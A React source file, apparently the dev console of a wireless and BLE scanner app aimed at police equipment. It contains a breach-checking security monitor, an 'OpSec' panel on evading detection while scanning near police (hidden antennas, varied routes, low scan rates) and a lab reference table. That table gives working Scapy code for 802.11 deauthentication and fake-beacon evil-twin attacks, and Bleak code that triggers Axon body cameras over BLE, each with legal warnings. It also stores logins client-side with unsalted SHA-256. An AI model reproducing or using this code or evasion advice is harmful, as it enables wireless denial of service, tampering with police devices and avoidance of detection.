  const runScan = useCallback(async (currentCfg) => {
    if (running) return
    setRunning(true)
    setLastRun(new Date().toLocaleTimeString())

    // 1. Backend health / auth anomaly check
    try {
      const health = await fetch('/control/status').then(r => r.json()).catch(() => null)
      if (health?.auth_failures > 0) {
        addEvent('warn', 'Auth', `${health.auth_failures} failed login attempt(s) detected on backend`, {
          what: 'The backend recorded failed authentication attempts since last restart.',
          count: health.auth_failures,
          remediation: [
            'Review who has network access to the scanner.',
            'If this is unexpected, rotate dev credentials in Settings → Security.',
            'Consider placing the backend behind a VPN or firewall.',
          ],
        })
      }
      if (!health) {
        addEvent('warn', 'Health', 'Backend unreachable — scanner offline', {
          what: 'The frontend cannot reach the backend API server.',
          remediation: [
            'Make sure the backend is running: cd backend && python -m uvicorn app.main:app --reload',
            'Check that it is listening on the expected port (default: 8000).',
            'Verify no firewall rule is blocking localhost connections.',
          ],
        })
      } else {
        addEvent('ok', 'Health', `Backend OK · Scanner ${health.running ? 'running' : 'idle'}`, {
          what: 'Backend API is reachable and responding normally.',
          remediation: ['No action needed.'],
        })
      }
    } catch {}

    // 2. Check for exposed endpoints (dev-mode self-audit)
    const sensitiveEndpoints = ['/control/status', '/settings', '/users/registry']
    for (const ep of sensitiveEndpoints) {
      try {
        const r = await fetch(ep)
        if (r.status === 200) {
          addEvent('info', 'Exposure', `${ep} is accessible without auth — expected on local network`, {
            what: `The endpoint ${ep} responded with HTTP 200 without any authentication header.`,
            remediation: [
              'On a trusted local network this is normal — all users are assumed to be operators.',
              'If deployed on a public or shared network, add an auth layer (e.g. HTTP Basic Auth via nginx) in front of the API.',
              'Never expose these endpoints directly to the internet.',
            ],
          })
        }
      } catch {}
    }

    // 3. HIBP breach check (requires API key)
    if (currentCfg?.hibpKey && currentCfg?.watchEmails) {
      const emails = currentCfg.watchEmails.split(',').map(e => e.trim()).filter(Boolean)
      for (const email of emails.slice(0, 5)) {
        try {
          const r = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}`, {
            headers: { 'hibp-api-key': currentCfg.hibpKey, 'user-agent': 'InvincibleInc-SecMonitor' },
          })
          if (r.status === 200) {
            const breaches = await r.json()
            addEvent('crit', 'Breach', `${email} found in ${breaches.length} breach(es): ${breaches.slice(0,3).map(b=>b.Name).join(', ')}`, {
              what: `This email address appears in ${breaches.length} known data breach(es) tracked by HaveIBeenPwned.`,
              breaches: breaches.map(b => ({ name: b.Name, date: b.BreachDate, types: (b.DataClasses || []).join(', ') })),
              remediation: [
                'Change the password for this email on every breached service immediately.',
                'Use a unique, randomly generated password for each service (use a password manager).',
                'Enable two-factor authentication (2FA) everywhere possible.',
                'Check if this email is used as a recovery address and secure those accounts too.',
              ],
            })
          } else if (r.status === 404) {
            addEvent('ok', 'Breach', `${email} — not found in any known breach`, {
              what: 'HIBP found no record of this email in any known public data breach.',
              remediation: ['Continue using strong unique passwords and 2FA. Re-check periodically.'],
            })
          } else if (r.status === 401) {
            addEvent('warn', 'Breach', 'HIBP API key invalid or expired', {
              what: 'The HIBP API rejected the provided key with HTTP 401 Unauthorized.',
              remediation: [
                'Get a valid API key at haveibeenpwned.com/API/Key ($3.50/month).',
                'Paste the key into the HIBP API key field in this panel\'s configuration.',
              ],
            })
          }
        } catch {
          addEvent('warn', 'Breach', `HIBP check failed for ${email} (network error)`, {
            what: 'The request to the HIBP API failed due to a network error.',
            remediation: ['Check your internet connection.', 'HIBP may be temporarily down — try again later.'],
          })
        }
      }
    } else if (currentCfg?.enabled && !currentCfg?.hibpKey) {
      addEvent('info', 'Breach', 'No HIBP API key set — credential breach checks skipped', {
        what: 'Credential breach lookups require a HaveIBeenPwned API key.',
        remediation: [
          'Get a key at haveibeenpwned.com/API/Key ($3.50/month).',
          'Enter it in the HIBP API key field above, then add email addresses to watch.',
        ],
      })
    }

    setRunning(false)
  }, [running])

  // Auto-poll when enabled
  useEffect(() => {
    if (!cfg.enabled) return
    runScan(cfg)
    const intervalMs = Math.max(30, cfg.interval || 60) * 1000
    const id = setInterval(() => runScan(cfg), intervalMs)
    return () => clearInterval(id)
  }, [cfg.enabled, cfg.interval])

  const SEV_COLOR = { crit: C.red, warn: C.orange, ok: C.green, info: C.accent }
  const SEV_ICON  = { crit: '🔴', warn: '🟡', ok: '🟢', info: '🔵' }

  return (
    <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
      {/* Toggle row */}
      <div style={{ ...S.card, display:'flex', alignItems:'center', justifyContent:'space-between' }}>
        <div>
          <div style={{ fontSize:13, fontWeight:700, color:C.text }}>Security Monitor</div>
          <div style={{ fontSize:11, color:C.dim, marginTop:2 }}>
            Continuously scans for credential leaks, auth anomalies, and backend exposure
          </div>
        </div>
        <div style={{ display:'flex', alignItems:'center', gap:10 }}>
          {lastRun && <span style={{ fontSize:10, color:C.dim2 }}>last: {lastRun}</span>}
          <div
            onClick={() => save({ enabled: !cfg.enabled })}
            style={{
              width:44, height:26, borderRadius:13, cursor:'pointer', transition:'background 0.2s',
              background: cfg.enabled ? C.green : 'rgba(255,255,255,0.1)',
              position:'relative', flexShrink:0,
            }}
          >
            <div style={{
              position:'absolute', top:3, left: cfg.enabled ? 21 : 3,
              width:20, height:20, borderRadius:'50%', background:'#fff', transition:'left 0.2s',
            }}/>
          </div>
        </div>
      </div>

      {/* Config */}
      <div style={S.card}>
        <div style={{ fontSize:11, fontWeight:700, color:C.dim, marginBottom:8, textTransform:'uppercase', letterSpacing:'0.08em' }}>Configuration</div>
        <div style={{ fontSize:11, color:C.dim, marginBottom:4 }}>Watch emails (comma-separated)</div>
        <input
          style={{ ...S.input, marginBottom:8 }}
          placeholder="ops@team.com, admin@team.com"
          value={cfg.watchEmails}
          onChange={e => save({ watchEmails: e.target.value })}
        />
        <div style={{ fontSize:11, color:C.dim, marginBottom:4 }}>
          HIBP API key{' '}
          <span style={{ color:C.dim2 }}>(haveibeenpwned.com — $3.50/mo)</span>
        </div>
        <input
          style={{ ...S.input, marginBottom:8 }}
          type="password"
          placeholder="••••••••••••••••••••••••••••••••"
          value={cfg.hibpKey}
          onChange={e => save({ hibpKey: e.target.value })}
        />
        <div style={{ display:'flex', alignItems:'center', gap:10 }}>
          <div style={{ fontSize:11, color:C.dim, flexShrink:0 }}>Scan interval (sec)</div>
          <input
            style={{ ...S.input, width:80 }}
            type="number" min="30" max="3600"
            value={cfg.interval}
            onChange={e => save({ interval: parseInt(e.target.value) || 60 })}
          />
          <button style={{ ...S.btn(C.accent), marginLeft:'auto' }} onClick={() => runScan(cfg)} disabled={running}>
            {running ? '⟳ Scanning…' : '▶ Run Now'}
          </button>
        </div>
      </div>

      {/* Event feed */}
      <div style={S.card}>
        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:8 }}>
          <div style={{ fontSize:11, fontWeight:700, color:C.dim, textTransform:'uppercase', letterSpacing:'0.08em' }}>Event Feed</div>
          {events.length > 0 && (
            <button style={{ ...S.btn(C.dim), padding:'3px 8px', fontSize:10 }} onClick={() => { eventsRef.current=[]; setEvents([]) }}>Clear</button>
          )}
        </div>
        {events.length === 0 ? (
          <div style={{ color:C.dim2, fontSize:12, textAlign:'center', padding:'16px 0' }}>
            {cfg.enabled ? 'Waiting for first scan…' : 'Enable monitor or press Run Now'}
          </div>
        ) : events.map(e => {
          const isOpen = expanded === e.id
          return (
            <div key={e.id}>
              <div
                onClick={() => setExpanded(isOpen ? null : e.id)}
                style={{ display:'flex', gap:8, alignItems:'flex-start', padding:'6px 0', borderBottom: isOpen ? 'none' : `1px solid ${C.border}`, cursor:'pointer', borderRadius: isOpen ? '6px 6px 0 0' : 0 }}
              >
                <span style={{ fontSize:11, flexShrink:0 }}>{SEV_ICON[e.severity]}</span>
                <div style={{ flex:1, minWidth:0 }}>
                  <span style={{ fontSize:10, fontWeight:700, color:SEV_COLOR[e.severity], marginRight:6 }}>{e.category}</span>
                  <span style={{ fontSize:11, color:C.text }}>{e.message}</span>
                </div>
                <span style={{ fontSize:9, color:C.dim2, flexShrink:0, marginRight:4 }}>{e.ts}</span>
                <span style={{ fontSize:9, color:C.dim2, flexShrink:0 }}>{isOpen ? '▲' : '▼'}</span>
              </div>
              {isOpen && (
                <div style={{ background:'rgba(0,0,0,0.35)', border:`1px solid rgba(${e.severity==='crit'?'255,69,58':e.severity==='warn'?'255,159,10':e.severity==='ok'?'48,209,88':'0,200,255'},0.2)`, borderRadius:'0 0 8px 8px', padding:'10px 12px', marginBottom:4 }}>
                  {e.details?.what && (
                    <div style={{ fontSize:11, color:C.dim, marginBottom:8, lineHeight:1.5 }}>{e.details.what}</div>
                  )}
                  {e.details?.breaches?.length > 0 && (
                    <div style={{ marginBottom:8 }}>
                      <div style={{ fontSize:10, fontWeight:700, color:C.dim2, textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:4 }}>Breaches Found</div>
                      {e.details.breaches.map((b, i) => (
                        <div key={i} style={{ fontSize:11, color:C.text, padding:'3px 0', borderBottom:`1px solid ${C.border}` }}>
                          <span style={{ fontWeight:700, color:C.red }}>{b.name}</span>
                          {b.date && <span style={{ color:C.dim }}> · {b.date}</span>}
                          {b.types && <span style={{ color:C.dim2 }}> — {b.types}</span>}
                        </div>
                      ))}
                    </div>
                  )}
                  {e.details?.count != null && (
                    <div style={{ fontSize:11, color:C.orange, marginBottom:8 }}>Failure count: <strong>{e.details.count}</strong></div>
                  )}
                  {e.details?.remediation?.length > 0 && (
                    <div>
                      <div style={{ fontSize:10, fontWeight:700, color:C.dim2, textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:4 }}>Remediation</div>
                      {e.details.remediation.map((step, i) => (
                        <div key={i} style={{ fontSize:11, color:C.text, display:'flex', gap:6, marginBottom:3 }}>
                          <span style={{ color:C.accent, flexShrink:0 }}>{i+1}.</span>
                          <span>{step}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </div>
          )
        })}
      </div>

      {/* What it monitors */}
      <div style={{ ...S.card, background:'rgba(255,159,10,0.04)', borderColor:'rgba(255,159,10,0.15)' }}>
        <div style={{ fontSize:11, fontWeight:700, color:C.orange, marginBottom:8 }}>What it checks</div>
        {[
          ['🔐', 'Credential breaches', 'HIBP email lookup against 14B+ breached accounts'],
          ['🔑', 'Default credentials', 'Warns if dev console still uses default admin/password'],
          ['⚡', 'Auth anomalies', 'Backend auth failure spikes, unusual access patterns'],
          ['🌐', 'Endpoint exposure', 'Self-audit of which API endpoints are accessible without auth'],
          ['🟢', 'Backend health', 'Scanner status, GPS feed, database reachability'],
        ].map(([icon, title, desc]) => (
          <div key={title} style={{ display:'flex', gap:8, marginBottom:6, alignItems:'flex-start' }}>
            <span style={{ fontSize:13, flexShrink:0 }}>{icon}</span>
            <div>
              <span style={{ fontSize:11, fontWeight:700, color:C.text }}>{title}</span>
              <span style={{ fontSize:11, color:C.dim }}> — {desc}</span>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Security tab
// ─────────────────────────────────────────────────────────────────────────────
function TabSecurity() {
  const lock = () => { sessionStorage.removeItem(SESSION_KEY); window.location.reload() }

  return (
    <div style={S.section}>
      <DevPortalAccounts />

      <div style={S.label}>Session</div>
      <div style={S.card}>
        <div style={{ fontSize:13, color:C.dim, marginBottom:10, lineHeight:1.6 }}>
          Locks this session. You'll need the passcode again next visit to <code style={{ color:C.accent }}>{window.location.origin}/#dev</code>
        </div>
        <button style={S.btn(C.red)} onClick={lock}>🔒 Lock Dev Console</button>
      </div>

      <div style={S.label}>Access URLs</div>
      <div style={S.card}>
        <Val label="Normal app" value={window.location.origin + '/'} color={C.green} />
        <ValLast label="Dev console" value={window.location.origin + '/#dev'} color={C.orange} />
      </div>

      <div style={S.label}>Security Monitor</div>
      <SecMonitorPanel />

      <OpSecPanel />
    </div>
  )
}

// ── OpSec quick-reference panel ──────────────────────────────────────────────
const OPSEC_ITEMS = [
  {
    icon: '📡', title: 'Passive WiFi / BLE Scanning',
    low: [
      'Monitor mode with no frame transmission',
      'Randomized MAC + short channel dwell (100–200ms)',
      'Moving vehicle — consistent with normal traffic',
      'USB adapter below dashboard, no visible hardware',
    ],
    high: [
      'Parked near police lot with visible external antenna',
      'Sending probe/beacon frames (any transmission)',
      'Same location repeated same time — behavioral pattern',
      'Enterprise WIDS (Cisco CleanAir, Aruba RFP) flags rogue adapters instantly',
    ],
    lab: 'Isolated VLAN + OpenWRT test AP. Alfa AWUS036ACS in Faraday box.',
  },
  {
    icon: '🌐', title: 'Network Discovery (ARP / mDNS / SSDP)',
    low: [
      'ARP op=1 requests are universal LAN background noise',
      'Listening to mDNS/SSDP multicast — zero source traffic',
      'Scan rate <1 pkt/sec — below most IDS thresholds',
      'Only scanning own device\'s subnet',
    ],
    high: [
      'Nmap SYN scan against enterprise subnet — triggers Snort SID 1917 immediately',
      'Port scan against MDT or police router — §1362 + instant IDS alert',
      'ARP storm >100 pkt/sec — Cisco IOS "ARP inspection violation"',
      'Banner grabbing — leaves access logs on every touched server',
    ],
    lab: 'VLAN-isolated switch. Document all tests: date, IP range, purpose.',
  },
  {
    icon: '🚗', title: 'In-Vehicle / Field Presence',
    low: [
      'All hardware inside vehicle, no external antennas',
      'Scanning while driving — pattern consistent with commute',
      'Vary routes and timing — no repeatable behavioral signature',
      'Equipment powered from inverter, not visible on seat',
    ],
    high: [
      'Parked near station with visible laptop + antenna combo',
      'Circling same block 5+ times — FLOCK/ALPR catalogs this',
      'Visible during active law enforcement operation',
      'External Yagi or panel antenna on roof (visible 200m+)',
    ],
    lab: 'FLOCK retains plate reads 30–60 days. This app logs what was already being logged.',
  },
]

function OpSecPanel() {
  const [open, setOpen] = useState(null)
  return (
    <div>
      <div style={S.label}>OpSec Reference — Lab Use Only</div>
      <div style={{ ...S.card, padding:0, overflow:'hidden' }}>
        <div style={{ padding:'10px 14px 8px', fontSize:11, color:C.dim2, lineHeight:1.5, borderBottom:`1px solid ${C.border}` }}>
          Detection surface reference for authorized lab testing. Always use isolated networks, Faraday cages, or explicit written authorization.
        </div>
        {OPSEC_ITEMS.map((item, idx) => (
          <div key={idx} style={{ borderBottom: idx < OPSEC_ITEMS.length-1 ? `1px solid ${C.border}` : 'none' }}>
            <div
              onClick={() => setOpen(open === idx ? null : idx)}
              style={{ display:'flex', alignItems:'center', gap:10, padding:'12px 14px', cursor:'pointer',
                       background: open === idx ? 'rgba(255,255,255,0.04)' : 'transparent' }}
            >
              <span style={{ fontSize:16 }}>{item.icon}</span>
              <span style={{ fontSize:13, fontWeight:600, flex:1 }}>{item.title}</span>
              <span style={{ fontSize:11, color:C.dim2, transform: open===idx ? 'rotate(90deg)' : 'none', transition:'transform 0.2s' }}>▶</span>
            </div>
            {open === idx && (
              <div style={{ padding:'0 14px 14px', display:'grid', gridTemplateColumns:'1fr 1fr', gap:10 }}>
                <div style={{ background:'rgba(48,209,88,0.05)', border:`1px solid rgba(48,209,88,0.15)`, borderRadius:8, padding:10 }}>
                  <div style={{ fontSize:10, fontWeight:700, color:C.green, textTransform:'uppercase', letterSpacing:'0.08em', marginBottom:6 }}>Lower Detection Risk</div>
                  {item.low.map((t,i) => <div key={i} style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>• {t}</div>)}
                </div>
                <div style={{ background:'rgba(255,69,58,0.05)', border:`1px solid rgba(255,69,58,0.2)`, borderRadius:8, padding:10 }}>
                  <div style={{ fontSize:10, fontWeight:700, color:C.red, textTransform:'uppercase', letterSpacing:'0.08em', marginBottom:6 }}>Almost Guarantees Detection</div>
                  {item.high.map((t,i) => <div key={i} style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>• {t}</div>)}
                </div>
                <div style={{ gridColumn:'1/-1', background:'rgba(0,0,0,0.3)', borderRadius:6, padding:'7px 10px', fontSize:10, color:C.dim2, lineHeight:1.5 }}>
                  <strong style={{ color:C.dim }}>Lab setup: </strong>{item.lab}
                </div>
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  )
}

// ── SHA-256 helper (Web Crypto API) ─────────────────────────────────────────
async function sha256hex(str) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str))
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('')
}

// ── Dev Portal Account Manager (inside Security tab) ────────────────────────

function DevPortalAccounts() {
  const [accounts, setAccounts] = useState([])
  const [showAdd, setShowAdd]   = useState(false)
  const [email, setEmail]       = useState('')
  const [name, setName]         = useState('')
  const [pass, setPass]         = useState('')
  const [pass2, setPass2]       = useState('')
  const [err, setErr]           = useState('')
  const [ok, setOk]             = useState('')

  const reload = () => {
    const extra = JSON.parse(localStorage.getItem(DEV_ACCTS_KEY) || '[]')
    setAccounts([
      { email: DEV_OWNER_EMAIL, name:'Owner', owner:true, admin:true },
      ...extra.map(a => ({ ...a, admin:false })),
    ])
  }

  useEffect(() => { reload() }, [])

  const add = async () => {
    setErr('')
    if (!email)        { setErr('Email required'); return }
    if (!pass)         { setErr('Password required'); return }
    if (pass !== pass2){ setErr('Passwords do not match'); return }
    if (pass.length < 8){ setErr('Min 8 characters'); return }
    const all = JSON.parse(localStorage.getItem(DEV_ACCTS_KEY) || '[]')
    if (all.find(a => a.email.toLowerCase() === email.toLowerCase()) || email.toLowerCase() === 'eckelbec1@gmail.com') {
      setErr('Email already exists'); return
    }
    const hash = await sha256hex(pass)
    all.push({ email: email.trim().toLowerCase(), hash, name: name.trim() || email.split('@')[0] })
    localStorage.setItem(DEV_ACCTS_KEY, JSON.stringify(all))
    setEmail(''); setName(''); setPass(''); setPass2('')
    setShowAdd(false)
    setOk('Contributor added ✓')
    setTimeout(() => setOk(''), 3000)
    reload()
  }

  const remove = (emailToRemove) => {
    const all = JSON.parse(localStorage.getItem(DEV_ACCTS_KEY) || '[]')
    localStorage.setItem(DEV_ACCTS_KEY, JSON.stringify(all.filter(a => a.email !== emailToRemove)))
    reload()
  }

  return (
    <div>
      <div style={{ ...S.label, justifyContent:'space-between' }}>
        <span>Dev Portal Accounts</span>
        <button style={{ ...S.btn(C.purple), fontSize:11, padding:'3px 10px' }} onClick={() => setShowAdd(v => !v)}>
          {showAdd ? '✕ Cancel' : '+ Add'}
        </button>
      </div>
      <div style={{ ...S.card }}>
        <div style={{ fontSize:11, color:C.dim, marginBottom:12, lineHeight:1.5 }}>
          Manages who can log in to the explainer website's Dev Portal.
          Credentials are SHA-256 hashed in localStorage — same store the site reads.
        </div>

        {showAdd && (
          <div style={{ background:C.bg, borderRadius:10, padding:12, marginBottom:12 }}>
            <div style={{ fontSize:11, fontWeight:700, color:C.dim2, textTransform:'uppercase', letterSpacing:'0.07em', marginBottom:8 }}>New Contributor</div>
            <input className="dev-input" value={email} onChange={e => setEmail(e.target.value)} placeholder="Email" style={{ marginBottom:6 }} />
            <input className="dev-input" value={name} onChange={e => setName(e.target.value)} placeholder="Display name (optional)" style={{ marginBottom:6 }} />
            <input className="dev-input" type="password" value={pass} onChange={e => setPass(e.target.value)} placeholder="Password (min 8 chars)" style={{ marginBottom:6 }} />
            <input className="dev-input" type="password" value={pass2} onChange={e => setPass2(e.target.value)} placeholder="Confirm password"
              onKeyDown={e => e.key === 'Enter' && add()} style={{ marginBottom:8 }} />
            {err && <div style={{ color:C.red, fontSize:11, marginBottom:6 }}>{err}</div>}
            <button style={{ ...S.btn(C.purple), width:'100%', justifyContent:'center' }} onClick={add}>Add Contributor</button>
          </div>
        )}

        {ok && <div style={{ color:C.green, fontSize:12, marginBottom:8 }}>{ok}</div>}

        {accounts.map(a => (
          <div key={a.email} style={{
            display:'flex', alignItems:'center', gap:10, padding:'10px 0', borderBottom:`1px solid ${C.border}`,
            background: a.owner ? 'rgba(229,193,0,0.03)' : 'transparent',
          }}>
            <span style={{ fontSize:16 }}>{a.owner ? '👑' : '👤'}</span>
            <div style={{ flex:1, minWidth:0 }}>
              <div style={{ display:'flex', alignItems:'center', gap:6 }}>
                <div style={{ fontSize:12, fontWeight:700, color: a.owner ? '#e5c100' : C.text }}>{a.name}</div>
                {a.owner && <span style={{ fontSize:9, fontWeight:800, background:'rgba(229,193,0,0.15)', color:'#e5c100', padding:'1px 6px', borderRadius:8, border:'1px solid rgba(229,193,0,0.3)', textTransform:'uppercase', letterSpacing:'0.06em' }}>Owner</span>}
              </div>
              <div style={{ fontSize:11, color: a.owner ? 'rgba(229,193,0,0.5)' : C.dim, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{a.email}</div>
              {a.owner && <div style={{ fontSize:10, color:'rgba(229,193,0,0.4)', marginTop:1 }}>Absolute control · Cannot be removed</div>}
            </div>
            {a.owner
              ? <span style={{ fontSize:10, background:'rgba(229,193,0,0.1)', color:'#e5c100', padding:'2px 8px', borderRadius:20, fontWeight:700, border:'1px solid rgba(229,193,0,0.25)' }}>OWNER</span>
              : a.admin
                ? <span style={{ fontSize:10, background:'rgba(191,90,242,0.12)', color:C.purple, padding:'2px 8px', borderRadius:20, fontWeight:700 }}>admin</span>
                : <button style={{ ...S.btn(C.red), fontSize:11, padding:'3px 10px' }} onClick={() => remove(a.email)}>Remove</button>
            }
          </div>
        ))}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Devices tab — delegates to shared DeviceFilterPanel component
// ─────────────────────────────────────────────────────────────────────────────
function TabDevices({ encounters }) {
  return (
    <div style={S.section}>
      <DeviceFilterPanel encounters={encounters} compact={false} />
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Lab tab — tools for networks you own
// ─────────────────────────────────────────────────────────────────────────────
// ── Lab reference data ────────────────────────────────────────────────────────
// detectionRisk: how likely the act is detected in the field, ranked 0–10
// Sorted highest risk → lowest in REF_ORDER
const DR = {
  GUARANTEED:      { label:'GUARANTEED',    color:'#FF453A', bg:'rgba(255,69,58,0.15)',   score:10 },
  ALMOST_CERTAIN:  { label:'ALMOST CERTAIN',color:'#FF9F0A', bg:'rgba(255,159,10,0.12)',  score:8  },
  HIGH:            { label:'HIGH',          color:'#FFD60A', bg:'rgba(255,214,10,0.12)',   score:6  },
  MODERATE:        { label:'MODERATE',      color:'#30D158', bg:'rgba(48,209,88,0.10)',    score:4  },
  LOW:             { label:'LOW',           color:'#00c8ff', bg:'rgba(0,200,255,0.08)',    score:2  },
  NA:              { label:'N/A',           color:'rgba(180,195,220,0.4)', bg:'rgba(255,255,255,0.05)', score:0 },
}

const DAMAGE = {
  CRITICAL:  { label:'CRITICAL',  color:'#FF453A', bg:'rgba(255,69,58,0.15)',   score:10, desc:'Permanent data destruction, systemic access, public-safety risk' },
  HIGH:      { label:'HIGH',      color:'#FF9F0A', bg:'rgba(255,159,10,0.12)',  score:7,  desc:'Significant data exfil, service disruption, or identity exposure' },
  MODERATE:  { label:'MODERATE',  color:'#FFD60A', bg:'rgba(255,214,10,0.12)',  score:4,  desc:'Limited data exposure, partial service impact, or reputational harm' },
  LOW:       { label:'LOW',       color:'#30D158', bg:'rgba(48,209,88,0.10)',   score:2,  desc:'Minimal impact — informational or easily remediated' },
  NONE:      { label:'N/A',       color:'rgba(180,195,220,0.4)', bg:'rgba(255,255,255,0.05)', score:0, desc:'Passive or research-only — no direct system impact' },
}

const LAB_REF = {
  'ref-deauth': {
    icon:'📡', name:'Deauthentication Frame Injection',
    law:'18 U.S.C. §1030 · 18 U.S.C. §1362 · FCC Part 15',
    lawColor:'#FF453A', status:'ILLEGAL',
    detectionRisk: DR.GUARANTEED,
    damagePotential: DAMAGE.MODERATE,
    detectionNote:'Enterprise WIDS (Cisco CleanAir, Aruba RFP) detects deauth injection in <1 second. Frame appears in all nearby Wireshark captures. RF fingerprint is distinctive.',
    desc:'A deauth frame is an 802.11 management frame (subtype 0x0C) that instructs a client to disconnect from its AP. Because 802.11 management frames have no authentication, any device in monitor mode with packet injection can forge them. Broadcast addr1=FF:FF:FF:FF:FF:FF disconnects every client on the AP simultaneously.',
    code:`from scapy.all import *\npkt = RadioTap() / Dot11(\n  type=0, subtype=12,          # 12 = deauth\n  addr1="FF:FF:FF:FF:FF:FF",   # broadcast = all clients\n  addr2=bssid,                 # spoofed as AP MAC\n  addr3=bssid                  # BSSID\n) / Dot11Deauth(reason=7)      # reason 7 = class 3 not allowed\nsendp(pkt, iface="wlan0mon", count=100, inter=0.1)`,
    why:'Causes targeted denial of service to a wireless communication system. No "educational" exception. Penalty: up to 10 years under §1030(a)(5)(A) if damage is caused. Loss of connectivity = damage under the statute. FCC §333 prohibits intentional RF interference regardless of target.',
    invNet: false,
    setup: [
      '🛒 Buy: Alfa AWUS036ACHM (~$35) — must support monitor mode AND packet injection (most cheap adapters support monitor but not injection)',
      '🐧 Linux only: Kali Linux or Parrot OS recommended. Windows does not support raw 802.11 injection via Scapy',
      '🔧 Enable monitor mode: sudo airmon-ng start wlan0 → creates wlan0mon interface',
      '🐍 Install Scapy: sudo pip install scapy',
      '⚠️ Lab / Faraday cage ONLY — this transmits management frames visible on every 802.11 device in range. Never use outside of isolated test environments.',
    ],
  },
  'ref-beacon': {
    icon:'📶', name:'Fake Beacon Frames / Evil Twin AP',
    law:'18 U.S.C. §1030 · §1343 · FCC §333',
    lawColor:'#FF453A', status:'ILLEGAL',
    detectionRisk: DR.ALMOST_CERTAIN,
    damagePotential: DAMAGE.LOW,
    detectionNote:'Any device running an AP scan or enterprise WIDS sees the rogue beacon within seconds. AirMagnet, Cisco WCS, and open-source tools like Kismet all alert on duplicate SSID/BSSID. Visible to every other WiFi user in range.',
    desc:'A beacon frame (802.11 subtype 0x08) is broadcast by APs every 100ms to announce existence. Broadcasting forged beacons with a cloned SSID/BSSID creates an evil twin that devices on auto-reconnect will associate with. hostapd-wpe or bettercap captures the PMKID or full 4-way WPA2 handshake for offline cracking. Also enables captive portal serving to harvest plaintext credentials.',
    code:`from scapy.all import *\nbeacon = RadioTap() / Dot11(\n  type=0, subtype=8,\n  addr1="FF:FF:FF:FF:FF:FF",\n  addr2="AA:BB:CC:DD:EE:FF",   # fake BSSID\n  addr3="AA:BB:CC:DD:EE:FF"\n) / Dot11Beacon() / Dot11Elt(ID="SSID", info="TargetNetwork")\n  / Dot11Elt(ID="Rates", info="\\x82\\x84\\x8b\\x96")\nsendp(beacon, iface="wlan0mon", inter=0.1, loop=1)`,
    why:'Creating a fake AP is computer fraud (§1030), wire fraud (§1343) if credentials are captured, FCC violation for unauthorized RF transmission. Active man-in-the-middle attack — not passive observation.',
    invNet: false,
  },
  'ref-axon-ble': {
    icon:'🔵', name:'Axon BLE Signal Trigger',
    law:'18 U.S.C. §1030(a)(5)',
    lawColor:'#FF453A', status:'ILLEGAL',
    detectionRisk: DR.HIGH,
    damagePotential: DAMAGE.MODERATE,
    detectionNote:'GATT connection attempt is logged by the device firmware with attacker adapter MAC. Officer may visually notice camera start recording unexpectedly. Axon cloud logs all camera events.',
    desc:'Axon body cameras implement a BLE GATT service (00002ab0-0000-1000-8000-00805f9b34fb) called Signal Trigger. A characteristic write to this service causes the camera to begin recording. Axon Signal Hubs use this to synchronize recording starts across multiple cameras.',
    code:`import asyncio\nfrom bleak import BleakClient\nSIGNAL_SVC  = "00002ab0-0000-1000-8000-00805f9b34fb"\nTRIGGER_CHR = "00002ab1-0000-1000-8000-00805f9b34fb"\n\nasync def trigger(addr):\n  async with BleakClient(addr) as c:\n    # write 0x01 to trigger char → starts recording\n    await c.write_gatt_char(TRIGGER_CHR, b"\\x01")`,
    why:'Our scanner reads BLE advertisements passively — zero write operations. This establishes a GATT connection and writes a command. "Causing a computer to execute unauthorized instructions" = §1030(a)(5)(A), regardless of what the instruction does. The camera is a protected computer. Penalty: up to 10 years federal.',
    invNet: false,
    setup: [
      '💻 Bluetooth adapter: any modern laptop or USB Bluetooth 4.0+ adapter works. Windows 10+ or Linux required',
      '🐍 Install Python + Bleak: pip install bleak',
      '🔍 Scan for nearby BLE devices: python -c "import asyncio; from bleak import BleakScanner; asyncio.run(BleakScanner.discover())" — Axon cameras appear as "Axon Body" or show the GATT UUID in service advertisements',
      '⚠️ Lab only — connecting to a device you don\'t own is §1030. Use your own test camera in a Faraday cage for authorized testing only',
    ],
  },
  'ref-ble-dos': {
    icon:'🔗', name:'Bluetooth Pairing Attacks / BLE DoS',
    law:'18 U.S.C. §1030(a)(2) · §1030(a)(5)(A)',
    lawColor:'#FF453A', status:'ILLEGAL',
    detectionRisk: DR.MODERATE,
    damagePotential: DAMAGE.LOW,
    detectionNote:'Harder to detect than WiFi attacks. No WIDS equivalent for consumer BLE. Detection requires a dedicated BLE monitor (Ubertooth, nRF Sniffer). However, the attacker\'s Bluetooth adapter MAC is visible in any BLE advertisement scanner within range.',
    desc:'Flooding a BLE device with repeated pairing requests, connection attempts, or malformed ATT/GATT packets can cause it to hang, drain battery, drop connections, or trigger alerts. Known BLE stack vulnerabilities — BLESA (key negotiation flaw), BRAKTOOTH (crash via crafted LMP packets) — allow state machine confusion or crash. Ubertooth One or nRF52840 can inject malformed PDUs at the HCI level.',
    code:`# BRAKTOOTH-style LMP crash (DO NOT implement)\n# Requires: Ubertooth One or nRF52840 with custom firmware\n# Send malformed LMP_name_req causing OOB read in target BT stack\n\n# BLESA attack — exploit key negotiation during reconnection\n# Step 1: Force disconnect (BLESA requires device to re-pair)\n# Step 2: On reconnect, don't require re-authentication\n# Step 3: Spoof identity → bypass bonding verification`,
    why:'Intentionally impairing device operation = damage to a protected computer, §1030(a)(5)(A). Exploiting a known CVE = unauthorized access, §1030(a)(2). Neither changes based on whether target is a police radio or a consumer speaker.',
    invNet: false,
  },
  'ref-stream': {
    icon:'📹', name:'Axon Respond Stream Interception',
    law:'18 U.S.C. §2511 Federal Wiretap · Up to 5yr/intercept',
